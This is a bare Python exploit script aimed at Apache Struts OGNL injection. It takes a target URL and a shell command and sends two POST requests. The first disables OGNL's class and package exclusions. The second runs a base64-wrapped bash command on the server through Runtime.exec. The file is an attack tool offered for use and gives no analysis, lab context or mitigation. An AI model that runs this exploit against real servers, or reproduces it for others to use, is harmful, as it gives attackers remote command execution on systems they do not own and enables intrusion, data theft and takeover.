#-*-coding:utf-8-*-
import requests
import sys
import base64

#url = "http://127.0.0.1:8080"
url = sys.argv[1]
_cmd = sys.argv[2]

print(url)
b64_cmd = base64.b64encode(_cmd.encode("UTF-8"))
print(b64_cmd)

payload = "bash -c {echo,%s}|{base64,-d}|{bash,-i}" % b64_cmd.decode("UTF-8")
print(payload)

data1 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
}
_id ='%{{(#context=#attr[\'struts.valueStack\'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(\'{}\'))}}'.format(payload)
#print(_id)
data2 = {
    "id": _id
}
res1 = requests.post(url, data=data1)
res2 = requests.post(url, data=data2)
